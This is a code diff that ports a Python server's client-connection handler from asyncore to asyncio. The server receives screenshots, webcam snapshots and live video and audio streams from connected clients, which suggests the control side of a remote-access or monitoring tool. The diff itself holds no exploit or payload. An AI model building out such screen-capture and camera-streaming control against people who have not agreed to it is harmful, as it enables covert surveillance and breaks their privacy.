@@ -1,4 +1,4 @@
-import asyncore
+import asyncio
 import os
 import threading
 
@@ -28,48 +28,82 @@ CONNECTION_DISCONNECT_TEMPLATE = "[{time}] Client {addr} disconnected"
 CONNECTION_LOST_TEMPLATE = "[{time}] Client {addr} lost connection"
 
 
-class ConnectionHandler(asyncore.dispatcher_with_send):
+class ConnectionHandler:
     receiving_screenshot = False
     receiving_snapshot = False
 
-    def __init__(self, sock, addr, window, iD, connections):
-        asyncore.dispatcher_with_send.__init__(self, sock)
+    def __init__(self, reader, writer, addr, window, iD, connections):
+        self.reader = reader
+        self.writer = writer
         self.window = window
         self.id = iD
         self.addr = addr
         self._connections = connections
         self._service_handlers = []
         self._encryption_handler = None
+        self._running = True
 
-    def handle_read(self):
-        global CURRENT_FOLDER
-        data = self.recv(BUFFER_DEFAULT).decode(ENCODING)
-        if data == DATA_TAKEN_SCREENSHOT:
-            ConnectionHandler.receiving_screenshot = True
-        if data == DATA_TAKEN_SNAPSHOT:
-            ConnectionHandler.receiving_snapshot = True
-        elif data == DATA_START_LIVESTREAM:
-            video_thread = threading.Thread(target=ConnectionHandler.video_stream)
-            video_thread.start()
-        elif data == DATA_START_AUDIOSTREAM:
-            audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
-            audio_thread.start()
-        elif data != "":
-            self.window.Output.addItem(f"{ts()} {data}")
-
-    def handle_close(self):
+    async def handle_client(self):
+        """Main handler for client connection - reads data and processes it."""
         try:
-            self.close()
+            while self._running:
+                try:
+                    data_bytes = await asyncio.wait_for(
+                        self.reader.read(BUFFER_DEFAULT), 
+                        timeout=1.0
+                    )
+                    if not data_bytes:
+                        # Connection closed by client
+                        break
+                    
+                    data = data_bytes.decode(ENCODING)
+                    
+                    if data == DATA_TAKEN_SCREENSHOT:
+                        ConnectionHandler.receiving_screenshot = True
+                    elif data == DATA_TAKEN_SNAPSHOT:
+                        ConnectionHandler.receiving_snapshot = True
+                    elif data == DATA_START_LIVESTREAM:
+                        video_thread = threading.Thread(target=ConnectionHandler.video_stream)
+                        video_thread.start()
+                    elif data == DATA_START_AUDIOSTREAM:
+                        audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
+                        audio_thread.start()
+                    elif data != "":
+                        self.window.Output.addItem(f"{ts()} {data}")
+                        
+                except asyncio.TimeoutError:
+                    # No data received, continue loop
+                    continue
+                except Exception as e:
+                    # Connection error
+                    self.window.Output.addItem(CONNECTION_LOST_TEMPLATE.format(time=ts(), addr=self.addr))
+                    break
+                    
+        finally:
+            await self.close()
+
+    async def close(self):
+        """Close the connection and clean up."""
+        self._running = False
+        try:
+            if self.writer and not self.writer.is_closing():
+                self.writer.close()
+                await self.writer.wait_closed()
+        except Exception:
+            pass
         finally:
             self._connections.pop(self.id, None)
             self.window.Output.addItem(CONNECTION_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr))
 
-    def handle_expt(self):
-        try:
-            self.close()
-        finally:
-            self._connections.pop(self.id, None)
-            self.window.Output.addItem(CONNECTION_LOST_TEMPLATE.format(time=ts(), addr=self.addr))
+    def send(self, data):
+        """Send data to the client."""
+        if self.writer and not self.writer.is_closing():
+            try:
+                if isinstance(data, str):
+                    data = data.encode(ENCODING)
+                self.writer.write(data)
+            except Exception:
+                pass
 
     @staticmethod
     def video_stream():
